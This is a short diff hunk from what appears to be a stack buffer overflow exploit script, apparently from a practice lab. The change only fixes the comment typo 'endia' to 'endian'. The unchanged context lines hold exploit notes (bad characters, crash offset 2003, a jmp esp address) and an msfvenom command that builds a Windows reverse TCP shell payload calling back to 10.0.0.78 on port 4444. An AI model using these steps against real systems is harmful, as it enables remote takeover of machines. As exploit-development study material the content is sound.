@@ -27,7 +27,7 @@ payload += ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x1
 # bad chars - "\x00"
 # offset address - 386F4337
 # [*] Exact match at offset 2003
-# jmp esp - 625011AF - little endia \xAF\x11\x50\x62
+# jmp esp - 625011AF - little endian \xAF\x11\x50\x62
 
 # msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.78 LPORT=4444 -b "\x00" -v shellcode -f c -f python
 
